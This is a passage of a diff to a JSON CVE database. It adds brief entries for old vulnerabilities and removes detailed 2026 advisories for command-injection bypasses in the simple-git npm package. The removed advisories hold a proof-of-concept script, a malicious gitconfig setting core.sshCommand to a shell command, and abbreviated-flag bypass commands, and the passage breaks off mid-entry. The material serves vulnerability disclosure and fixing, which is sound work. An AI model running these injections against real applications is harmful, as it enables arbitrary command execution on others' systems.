+        "http://online.securityfocus.com/archive/1/277049",
+        "http://www.securityfocus.com/bid/5023"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1704",
+      "summary": "Zeroboard 4.1, when the \"allow_url_fopen\" and \"register_globals\" variables are enabled, allows remote attackers to execute arbitrary PHP code by modifying the _zb_path parameter to reference a URL on a remote web server that contains the code.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://online.securityfocus.com/archive/1/277126",
+        "http://www.securityfocus.com/bid/5028",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/9366",
+        "http://online.securityfocus.com/archive/1/277126",
+        "http://www.securityfocus.com/bid/5028"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1705",
+      "summary": "Microsoft Internet Explorer 5.5 through 6.0 allows remote attackers to cause a denial of service (crash) via a Cascading Style Sheet (CSS) with the p{cssText} element declared and a bold font weight.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://online.securityfocus.com/archive/1/277133",
+        "http://online.securityfocus.com/archive/1/277140/2002-12-07/2002-12-13/2",
+        "http://www.securityfocus.com/bid/5027",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/9367",
+        "http://online.securityfocus.com/archive/1/277133"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1706",
+      "summary": "Cisco IOS software 11.3 through 12.2 running on Cisco uBR7200 and uBR7100 series Universal Broadband Routers allows remote attackers to modify Data Over Cable Service Interface Specification (DOCSIS) settings via a DOCSIS file without a Message Integrity Check (MIC) signature, which is approved by the router.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": "CWE-347",
+      "references": [
+        "http://www.cisco.com/warp/public/707/cmts-MD5-bypass-pub.shtml",
+        "http://www.securityfocus.com/bid/5041",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/9368",
+        "http://www.cisco.com/warp/public/707/cmts-MD5-bypass-pub.shtml",
+        "http://www.securityfocus.com/bid/5041"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1707",
+      "summary": "install.php in phpBB 2.0 through 2.0.1, when \"allow_url_fopen\" and \"register_globals\" variables are set to \"on\", allows remote attackers to execute arbitrary PHP code by modifying the phpbb_root_dir parameter to reference a URL on a remote web server that contains the code.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://online.securityfocus.com/archive/1/277318",
+        "http://www.securityfocus.com/bid/5038",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/9370",
+        "http://online.securityfocus.com/archive/1/277318",
+        "http://www.securityfocus.com/bid/5038"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1708",
+      "summary": "Cross-site scripting vulnerability (XSS) in BasiliX Webmail 1.10 allows remote attackers to execute arbitrary script as other users by injecting script into the (1) subject or (2) message fields.",
+      "cvssScore": 6.8,
+      "severity": "Medium",
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q2/0117.html",
+        "http://online.securityfocus.com/archive/1/277710",
+        "http://www.securityfocus.com/bid/5060",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/9384",
+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q2/0117.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1709",
+      "summary": "SQL injection vulnerability in BasiliX Webmail 1.10 allows remote attackers to obtain sensitive information or possibly modify data via the id variable.",
+      "cvssScore": 6.4,
+      "severity": "Medium",
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q2/0117.html",
+        "http://online.securityfocus.com/archive/1/277710",
+        "http://www.securityfocus.com/bid/5061",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/9385",
+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q2/0117.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0721",
+      "summary": "Integer signedness error in rfc2231_get_param from strings.c in PINE before 4.58 allows remote attackers to execute arbitrary code via an email that causes an out-of-bounds array access using a negative number.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2003-09-17",
+      "modified": null,
+      "cwe": "CWE-129",
+      "references": [
+        "http://lists.grok.org.uk/pipermail/full-disclosure/2003-September/009850.html",
+        "http://marc.info/?l=bugtraq&m=106329356702508&w=2",
+        "http://marc.info/?l=bugtraq&m=106367213400313&w=2",
+        "http://www.idefense.com/advisory/09.10.03.txt",
+        "http://www.redhat.com/support/errata/RHSA-2003-273.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0760",
+      "summary": "Blubster 2.5 allows remote attackers to cause a denial of service (crash) via a flood of connections to UDP port 701.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2003-09-17",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securiteam.com/windowsntfocus/5RP0N15AUC.html",
+        "http://www.securityfocus.com/bid/8482",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/13012",
+        "http://www.securiteam.com/windowsntfocus/5RP0N15AUC.html",
+        "http://www.securityfocus.com/bid/8482"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0761",
+      "summary": "Buffer overflow in the get_msg_text of chan_sip.c in the Session Initiation Protocol (SIP) protocol implementation for Asterisk releases before August 15, 2003, allows remote attackers to execute arbitrary code via certain (1) MESSAGE or (2) INFO requests.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2003-09-17",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.atstake.com/research/advisories/2003/a090403-1.txt",
+        "http://www.atstake.com/research/advisories/2003/a090403-1.txt"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0517",
+      "summary": "Netscape 4.73 and earlier does not properly warn users about a potentially invalid certificate if the user has previously accepted the certificate for a different web site, which could allow remote attackers to spoof a legitimate web site by compromising that site's DNS information.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2000-05-26",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.cert.org/advisories/CA-2000-08.html",
+        "http://www.securityfocus.com/bid/1260",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/4550",
+        "http://www.cert.org/advisories/CA-2000-08.html",
+        "http://www.securityfocus.com/bid/1260"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0166",
+      "summary": "NFS allows users to use a \"cd ..\" command to access other directories besides the exported file system.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1997-01-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0166",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0166"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0861",
+      "summary": "Microsoft Office Web Components (OWC) 2000 and 2002 allows remote attackers to bypass the \"Allow paste operations via script\" setting, even when it is disabled, via the (1) Copy method of the Cell object or (2) the Paste method of the Range object.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-09-24",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=101829726516346&w=2",
+        "http://www.iss.net/security_center/static/8779.php",
+        "http://www.securityfocus.com/bid/4457",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-044",
+        "http://marc.info/?l=bugtraq&m=101829726516346&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1021",
+      "summary": "Buffer overflows in WS_FTP 2.02 allow remote attackers to execute arbitrary code via long arguments to (1) DELE, (2) MDTM, (3) MLST, (4) MKD, (5) RMD, (6) RNFR, (7) RNTO, (8) SIZE, (9) STAT, (10) XMKD, or (11) XRMD.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-07-26",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-07/0610.html",
+        "http://www.ipswitch.com/Support/WS_FTP-Server/patch-upgrades.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6911",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-07/0610.html",
+        "http://www.ipswitch.com/Support/WS_FTP-Server/patch-upgrades.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1022",
+      "summary": "Format string vulnerability in pic utility in groff 1.16.1 and other versions, and jgroff before 1.15, allows remote attackers to bypass the -S option and execute arbitrary commands via format string specifiers in the plot command.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-07-26",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000428",
+        "http://www.debian.org/security/2001/dsa-072",
+        "http://www.debian.org/security/2002/dsa-107",
+        "http://www.osvdb.org/1914",
+        "http://www.redhat.com/support/errata/RHSA-2002-004.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1066",
+      "summary": "Quake 1 server responds to an initial UDP game connection request with a large amount of traffic, which allows remote attackers to use the server as an amplifier in a \"Smurf\" style attack on another host, by spoofing the connection request.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1999-12-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=94589559631535&w=2",
+        "http://marc.info/?l=bugtraq&m=94589559631535&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1109",
+      "summary": "Sendmail before 8.10.0 allows remote attackers to cause a denial of service by sending a series of ETRN commands then disconnecting from the server, while Sendmail continues to process the commands after the connection has been terminated.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1999-12-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=94632241202626&w=2",
+        "http://marc.info/?l=bugtraq&m=94780566911948&w=2",
+        "http://www.iss.net/security_center/static/7760.php",
+        "http://www.securityfocus.com/bid/904",
+        "http://marc.info/?l=bugtraq&m=94632241202626&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0002",
+      "summary": "Buffer overflow in ZBServer Pro 1.50 allows remote attackers to execute commands via a long GET request.",
+      "cvssScore": 10,
       "severity": "Critical",
-      "published": "2026-10-05",
-      "modified": "2026-10-05",
-      "cwe": {
-        "cwe_id": "CWE-78",
-        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
-      },
+      "published": "1999-12-22",
+      "modified": null,
+      "cwe": null,
       "references": [
-        "https://github.com/steveukx/git-js/security/advisories/GHSA-v5rq-49vh-5v5c",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-102829",
-        "https://github.com/steveukx/git-js/pull/1201",
-        "https://github.com/steveukx/git-js/commit/68874c239f0c7a87f4a68c3d2c4a0d7c75bb27f4",
-        "https://github.com/steveukx/git-js/releases/tag/@simple-git/argv-parser@2.0.1"
+        "http://marc.info/?l=bugtraq&m=94598388530358&w=2",
+        "http://www.ntbugtraq.com/default.asp?pid=36&sid=1&A2=ind9912&L=NTBUGTRAQ&P=R3556",
+        "http://www.securityfocus.com/bid/889",
+        "http://www.securityfocus.com/templates/archive.pike?list=1&msg=36B0596E.8D111D66%40teleline.es",
+        "http://marc.info/?l=bugtraq&m=94598388530358&w=2"
       ],
-      "vulnerableProducts": [
-        "@simple-git/argv-parser npm"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-102828",
-      "summary": "## Affected product\n\nThe default `blockUnsafeOperationsPlugin` in `simple-git` when an application permits untrusted values to reach `SimpleGitOptions.config` or Git inline configuration arguments such as `-c <key>=<value>`.\n\n## Summary\n\n`trailer.<token>.cmd` is not recognized as unsafe by the default guard. Therefore, a configured inline value reaches Git without a `GitPluginError`.\n\nGit documents `trailer.<token>.cmd` as a shell command invoked by `git interpret-trailers`. An application that relies on the default plugin to reject unsafe configuration can therefore execute a command supplied through an untrusted trailer-command configuration value.\n\n## Technical details\n\n`simple-git/src/lib/git-factory.ts` installs `commandConfigPrefixingPlugin` before `blockUnsafeOperationsPlugin`. The prefixing plugin in `simple-git/src/lib/plugins/command-config-prefixing-plugin.ts` turns every `SimpleGitOptions.config` entry into `-c <key>=<value>` before the unsafe-operation plugin evaluates the final argv.\n\nIn `simple-git@3.36.0`, `blockUnsafeOperationsPlugin` delegates to `@simple-git/argv-parser`. `packages/argv-parser/src/vulnerabilities/detect-vulnerable-config-writes.ts` compares parsed configuration writes against `preventUnsafeConfig`. That list has no matcher for `trailer.<token>.cmd`, so the invocation is allowed.\n\nGit v2.39.5's `Documentation/git-interpret-trailers.txt` states that `trailer.<token>.cmd` specifies a shell command called to generate or modify a trailer.\n\n## Preconditions\n\nThe application must use an affected `simple-git` version with the default unsafe-operation plugin active and must pass attacker-controlled data into instance configuration or Git command arguments that configure `trailer.<token>.cmd`.\n\nThe invoked Git binary must support the documented trailer-command behavior, and the application must execute `git interpret-trailers` with the attacker-controlled configuration in scope. The command runs with the operating-system identity and permissions of the Node.js process.\n\n## Verification\n\nUse an isolated test environment and a harmless executable test helper that records only its invocation.\n\n**Control:** Configure `core.editor=<test-helper>` through `SimpleGitOptions.config` and invoke a benign Git task. The default plugin should throw `GitPluginError` before spawning Git because `core.editor` is present in `preventUnsafeConfig`.\n\n**Bypass:** Configure `trailer.audit.cmd=<test-helper>` through the same option and invoke Git with the equivalent argv shape:\n\n`git -c trailer.audit.cmd=<test-helper> interpret-trailers --trailer audit:<value> <input-file>`\n\nA vulnerable build does not raise `GitPluginError`; Git invokes the test helper while processing the trailer. Confirm the helper invocation, then remove test artifacts.\n\n## Impact\n\nAn attacker who controls the stated configuration input can cause Git to execute a shell command as the Node.js application process. The impact is bounded by that process's filesystem, network, and service permissions. Applications that do not expose untrusted configuration or command arguments to `simple-git` are outside this threat model.\n\n## Affected versions\n\nCommit `6b3c631eadea81f80ed10f6dec7d19a9db4d7084` introduced the default unsafe-operation plugin, and `simple-git@3.15.0` is the first release confirmed to contain it. Its implementation only rejected `protocol.allow` configuration, leaving trailer-command configuration unblocked.\n\nThe latest `simple-git` release, `3.36.0`, still lacks a trailer-command matcher. The current `main` branch also lacks one. No released remediation was identified.\n\n## Remediation\n\nDefault-deny configuration keys that can trigger executable behavior, or add a dedicated unsafe category that rejects `trailer.<token>.cmd` before spawning Git unless the application explicitly opts in.\n\nEvaluate `trailer.<token>.command` alongside `.cmd`, because Git documents it as related command behavior. Add parser and integration tests for leading `-c`, configured instance prefixes, and `git config` write forms, asserting that no Git child process is spawned without an explicit unsafe opt-in.\n\n## Evidence\n\n- `simple-git@3.15.0` was released on 2022-11-12 and contains the initial unsafe-operation plugin.\n- `simple-git@3.36.0` was released on 2026-04-12; its parser source does not match `trailer.<token>.cmd`.\n- `main` retains the missing matcher in `packages/argv-parser/src/vulnerabilities/detect-vulnerable-config-writes.ts`.\n- Git v2.39.5 documents the trailer command behavior in `Documentation/git-interpret-trailers.txt`.\n- PR #1167 expanded other configuration checks but did not add a trailer-command matcher and is not release-backed as a remediation.\n- This review verified repository, release, and source artifacts through GitHub; it did not independently execute the runtime reproduction.",
-      "cvssScore": 9.2,
+      "id": "CVE-2000-0018",
+      "summary": "wmmon in FreeBSD allows local users to gain privileges via the .wmmonrc configuration file.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "1999-12-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.osvdb.org/1169",
+        "http://www.securityfocus.com/bid/885",
+        "http://www.osvdb.org/1169",
+        "http://www.securityfocus.com/bid/885"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0030",
+      "summary": "Solaris dmispd dmi_cmd allows local users to fill up restricted disk space by adding files to the /var/dmi/db database.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1999-12-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/bid/878",
+        "http://www.securityfocus.com/bid/878"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0032",
+      "summary": "Solaris dmi_cmd allows local users to crash the dmispd daemon by adding a malformed file to the /var/dmi/db database.",
+      "cvssScore": 10,
       "severity": "Critical",
-      "published": "2026-10-05",
-      "modified": "2026-10-05",
-      "cwe": {
-        "cwe_id": "CWE-78",
-        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
-      },
+      "published": "1999-12-22",
+      "modified": null,
+      "cwe": null,
       "references": [
-        "https://github.com/steveukx/git-js/security/advisories/GHSA-x6jw-m9v5-85vh",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-102828",
-        "https://github.com/steveukx/git-js/pull/1198",
-        "https://github.com/steveukx/git-js/commit/d762810c13b331ff1e5eb24c0b434646d2a8d1b3",
-        "https://github.com/steveukx/git-js/releases/tag/simple-git@4.0.1"
+        "http://www.osvdb.org/7582",
+        "http://www.securityfocus.com/bid/878",
+        "http://www.osvdb.org/7582",
+        "http://www.securityfocus.com/bid/878"
       ],
-      "vulnerableProducts": [
-        "simple-git npm"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-102826",
-      "summary": "## Summary\n\nAn OS command injection vulnerability in `git.clone()` allows any application that flows attacker-influenced data into `customArgs` to execute arbitrary code. simple-git 3.36.0 (current latest on npm) ships without any `include.path` entry in the `blockUnsafeOperationsPlugin` denylist. Passing `-c include.path=<file>` via customArgs loads any local file as a gitconfig. The loaded file can set `core.sshCommand` (or any otherwise-denied key), and the next remote operation in the same clone executes the attacker's command.\n\nPR #1167 (merged to main 2026-05-10, not yet released to npm) adds `preventConfigBuilder('include.path', 'allowUnsafeInclude')` to the denylist. The generated regex `/\\s*include.path/` closes the plain spelling but does not match the conditional form `includeIf.<cond>.path`. The variant therefore survives the upcoming release if the regex is not tightened in the same cycle.\n\nThis sits in the same denylist class as the prior incomplete-fix chain (CVE-2022-24433, CVE-2022-24066, CVE-2022-25912, CVE-2022-25860, CVE-2026-28291, CVE-2026-28292). `include` and `includeIf` are not referenced in any published advisory, in any commit prior to PR #1167, or anywhere in the 3.36.0 source.\n\n## Details\n\nTwo sinks share the same root cause: the denylist is incomplete.\n\n### Sink A: published 3.36.0 has no `include.path` entry\n\n`packages/argv-parser/src/vulnerabilities/detect-vulnerable-config-writes.ts` in the v3.36.0 tag contains no entry for `include.path` or `includeIf.*.path`. The argv parser recognises `-c include.path=<file>` and `-c includeIf.<cond>.path=<file>` as config writes, but `detectVulnerableConfigWrites` iterates a denylist that does not include either key. The plugin returns no vulnerability and the operation proceeds.\n\n### Sink B: pending PR #1167 regex misses `includeIf`\n\nPR #1167 adds:\n\n```ts\nconst preventUnsafeConfig = [\n   // ...\n   preventConfigBuilder('include.path', 'allowUnsafeInclude'),\n   // ...\n];\n```\n\n`preventConfigBuilder` constructs a non-anchored regex from the string:\n\n```ts\nfunction preventConfigBuilder(config, category, message) {\n   const regex = typeof config === 'string'\n      ? new RegExp(`\\\\s*${config.toLowerCase()}`)\n      : config;\n   return function preventCommand(key) {\n      if (regex.test(key)) { /* throw */ }\n   };\n}\n```\n\nFor `'include.path'`, the generated regex is `/\\s*include.path/`. The `.` between `include` and `path` is a regex wildcard. The engine matches `include` plus exactly one arbitrary character plus `path`. Conditional include keys have the form `includeIf.<condition>.path` (`includeIf.gitdir:.path`, `includeIf.onbranch:main.path`, `includeIf.hasconfig:r.u:**.path`, etc.). The substring between `include` and `path` is `if.<condition>:`, always longer than one character. The 11-character match window cannot align and the test returns false.\n\n```js\n/\\s*include.path/.test('include.path')                    // true\n/\\s*include.path/.test('includeif.gitdir:.path')          // false\n/\\s*include.path/.test('includeif.onbranch:main.path')    // false\n```\n\nThe argv parser at `packages/argv-parser/src/argv/analyse-config.ts` correctly recognises both `include.path=...` and `includeIf.gitdir:.path=...` as config writes; both yield a `ConfigWrite` with the lowercased key. The defect is purely in the denylist regex (after PR #1167) and in the entry being absent (before PR #1167).\n\n### Exploitation chain\n\n1. Attacker writes a gitconfig to any path the simple-git process can read. Realistic write primitives: file upload (avatar, attachment, CI artifact, S3-mounted bucket), shared `/tmp` in multi-tenant runners, log poisoning that lands `[core]` headers in a log path, predictable artifact paths, container volume mounts the attacker controls.\n\n   ```\n   [core]\n   sshCommand = \"/bin/sh -c 'id > /tmp/pwned; touch /tmp/RCE'\"\n   ```\n\n2. Attacker triggers `git.clone()` with crafted `customArgs`. Either the URL or the customArgs flow from attacker-influenced input. This is the documented threat model of `blockUnsafeOperationsPlugin`.\n\n3. `cloneTask` assembles `['clone', '-c', '<payload>', pathspec(url), pathspec(dst)]`.\n\n4. `blockUnsafeOperationsPlugin` runs `parseArgv` and `collectWriteFlags`, yielding the write. `detectVulnerableConfigWrites` iterates the denylist. In 3.36.0 the denylist has no entry. After PR #1167 the denylist has an entry but its regex does not match `includeif.gitdir:.path`. Either way, no vulnerability is yielded and the plugin permits the operation.\n\n5. `suffixPathsPlugin` moves pathspec items to the suffix. Final argv: `git clone -c <payload> -- ssh://target.example/repo.git /tmp/dst`.\n\n6. `git clone` has its own `-c` / `--config` option (`-c <key>=<value>, --config <key>=<value>` per `git clone --help`), so a `-c` immediately after the subcommand is honoured by clone itself. Git evaluates the include (the conditional form uses an empty `gitdir:` pattern that matches the current gitdir), reads `/tmp/attacker.cfg`, registers `core.sshCommand`.\n\n7. Git invokes ssh through the configured command. Attacker's shell payload runs in the simple-git process's context.\n\n`git clone` is the unique git subcommand that honours `-c` after itself. `git fetch -c k=v`, `git pull -c k=v`, `git push -c k=v` all reject the placement (those subcommands treat `-c` as a global option that must precede them). Since simple-git always places the subcommand at argv[0], user-controlled `-c` in `customArgs` always lands after the subcommand. Clone is the entry point for both sinks.\n\n### Secondary chain: `HOME` and `XDG_CONFIG_HOME` not in `parseEnv` denylist\n\n`packages/argv-parser/src/env/parse-env.ts:5-25` lists env keys removed from the spawned-process environment when sourced from `git.env(...)`. `HOME`, `XDG_CONFIG_HOME`, and similar config-resolution keys are absent. Calling `git.env({HOME: '/tmp/fake-home'})` makes git read `/tmp/fake-home/.gitconfig`, which the attacker controls. Same exploit primitive, parallel surface. Should be addressed in the same fix.\n\n## PoC\n\nReproduction from a clean install:\n\n```bash\nmkdir /tmp/sg-poc && cd /tmp/sg-poc\nnpm init -y\nnpm install simple-git@3.36.0\ncat > poc.js <<'EOF'\nconst { simpleGit } = require('simple-git');\nconst fs = require('fs');\n\nfs.writeFileSync('/tmp/sg-attacker.cfg',\n   `[core]\\nsshCommand = \"/bin/sh -c 'id > /tmp/sg-id; touch /tmp/sg-pwned'\"\\n`);\n\nconst git = simpleGit({ baseDir: '/tmp' });\n\n(async () => {\n   // Sink A: plain include.path works on published 3.36.0 (no denylist entry).\n   // Swap to 'includeIf.gitdir:.path=...' to demonstrate Sink B against PR #1167.\n   const payload = 'include.path=/tmp/sg-attacker.cfg';\n\n   try {\n      await git.clone(\n         'ssh://nonexistent.example.com/repo.git',\n         '/tmp/sg-rce-dst',\n         ['-c', payload]\n      );\n   } catch (_) { /* clone fails after sshCommand has already run */ }\n\n   await new Promise(r => setTimeout(r, 500));\n   console.log(fs.readFileSync('/tmp/sg-id', 'utf8'));\n})();\nEOF\nnode poc.js\n```\n\nOutput on simple-git 3.36.0:\n\n```\nuid=0(root) gid=0(root) groups=0(root)\n```\n\nSwapping the payload to `'includeIf.gitdir:.path=/tmp/sg-attacker.cfg'` reproduces the same RCE on 3.36.0 and is the variant that will survive the PR #1167 release.\n\n## Impact\n\nPre-authentication remote code execution in any server that flows attacker-influenced data into `customArgs` of `clone()` or `mirror()`. simple-git is approximately 9.4M weekly downloads on npm. Affected consumer patterns:\n\n- CI/CD systems and custom GitHub Actions / Buildkite plugins / GitLab cache helpers\n- PaaS and hosting platforms that accept customer-tunable git options\n- Code analyzers and security scanners that clone user-supplied repos\n- Bot frameworks (Probot, GitOps controllers) that wrap simple-git\n- AI agent frameworks that auto-clone repositories for analysis\n- VS Code extensions, Electron tools, and dev tooling that pass options through\n\nThe chain needs one byte of attacker-writable, process-readable storage in addition to customArgs influence. In consumers where the file-write primitive is co-located with the clone trigger (single-request file upload + clone, multi-tenant CI runners with shared `/tmp`, agent frameworks that write per-task scratch files), this is effectively unauthenticated pre-auth RCE with `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical`. The form value uses the conservative `AC:H = 8.1` baseline that accounts for the separate-request case.\n\n## Distinction from prior advisories and pending fix\n\nReviewed the published GHSA list at `steveukx/git-js/security/advisories`. Two advisories are published:\n\n- GHSA-jcxm-m3jx-f287 (CVE-2026-28291, High): generic option-parsing class addressed by the 3.32.0 refactor\n- GHSA-r275-fr43-pm7q (CVE-2026-28292, Critical): case-insensitive `protocol.allow` form\n\nNeither mentions `include`, `includeIf`, or conditional includes. The terms do not appear anywhere in source files, tests, or commits in the repository at any tagged release. PR #1167 (merged to main 2026-05-10) is the first commit anywhere in the repository to reference `include.path`. It addresses the plain form but its regex misses the conditional `includeIf.<cond>.path` spelling.\n\nThe published 3.36.0 vulnerability (Sink A) is unaddressed in any released version. The pending PR #1167 (Sink B) addresses the plain key but leaves the conditional variant open. Both should land in one release.\n\n## Suggested fix\n\nIn `packages/argv-parser/src/vulnerabilities/detect-vulnerable-config-writes.ts`, add the plain `include.path` entry and ensure conditional forms are covered:\n\n```ts\npreventConfigBuilder('include.path', 'allowUnsafeInclude'),\npreventConfigBuilder(/^\\s*includeif[^.]*(\\..+)*\\.path/i, 'allowUnsafeInclude', 'include.path'),\n```\n\nAlternatively pre-process the key in `parseAssignment` to strip the `if.<condition>:` decoration before testing against `include.path`, since `includeIf` is semantically equivalent to `include` for security purposes.\n\nStronger, longer-term fix: invert the model. Reject any `-c`, `--config`, `--config-env` in `customArgs` unconditionally and require callers to use the typed `config:` option (already prefix-checked through the same plugin). Git's config namespace is open-ended; new dangerous keys land in every git release. A denylist will need new entries indefinitely.\n\nAlso extend `parseEnv` to drop `HOME`, `XDG_CONFIG_HOME`, and any env key that affects config-file resolution.",
-      "cvssScore": 8.1,
-      "severity": "High",
-      "published": "2026-10-05",
-      "modified": "2026-10-05",
-      "cwe": {
-        "cwe_id": "CWE-77",
-        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')"
-      },
-      "references": [
-        "https://github.com/steveukx/git-js/security/advisories/GHSA-g4wm-2vf7-vfgr",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-102826",
-        "https://github.com/steveukx/git-js/pull/1193",
-        "https://github.com/steveukx/git-js/commit/98864c678444d9336357c844efa4fd5a7984c0d7",
-        "https://github.com/steveukx/git-js/releases/tag/simple-git@4.0.0"
-      ],
-      "vulnerableProducts": [
-        "simple-git npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-102827",
-      "summary": "simple-git's blockUnsafeOperationsPlugin blocks dangerous git options (--upload-pack/--receive-pack/--exec/...) unless the consumer opts in via unsafe:{allowUnsafePack:true}. Detection (@simple-git/argv-parser detectVulnerableFlags) matches the parsed flag NAME against literal-spelling patterns: /--(upload|receive)-pack/ (requires the literal '-pack') and the string '--exec'. But git accepts unambiguous prefix abbreviations of long options, and expandToken (token-expander.ts) returns the LITERAL token as flag.name (it uses the spec only for needsNext, never to canonicalize). So `git push --receive-p=<cmd>` parses with flag.name='--receive-p', which /--(upload|receive)-pack/ does NOT match, yet git expands --receive-p -> --receive-pack and runs <cmd> (on a local/file remote, locally). The clone side is robust (its '--u' substring rule catches every --upload* abbreviation); the push --receive-* and --exe* abbreviations have no equivalent rule and slip through.\n\nProof of concept (latest: simple-git 3.36.0, @simple-git/argv-parser 1.1.1, default unsafe plugin ON):\nGate vulnerabilityCheck: 'push --receive-pack=touch...' -> BLOCKED; 'push --receive-pa=touch...' and 'push --receive-p=touch...' -> BYPASS (empty vulns); '--exec=' BLOCKED, '--exe=' BYPASS.\nEnd-to-end via simpleGit().push():\n  CONTROL git.push(['../bare','HEAD:refs/heads/c','--receive-pack=touch /tmp/pwned_ctrl;']) -> throws GitPluginError 'Use of --upload-pack or --receive-pack is not permitted...'; no command runs.\n  BYPASS  git.push(['../bare','HEAD:refs/heads/e2e','--receive-p=touch /tmp/pwned_e2e;']) -> NO GitPluginError; /tmp/pwned_e2e CREATED (git executed the injected command); only a later GitError surfaces.\nDirect git confirms `git push ../bare --receive-p='touch X;' HEAD:refs/heads/m` and `--exe='touch Y;'` both execute on a local/path remote.\n\nImpact: any app relying on simple-git's default unsafe-operations protection while passing attacker-influenced options/args into a git push (local/file remote, or attacker-influenced receive-pack target) can be made to execute arbitrary commands -- the exact protection CVE-2026-28291 provided, defeated by an abbreviated spelling. 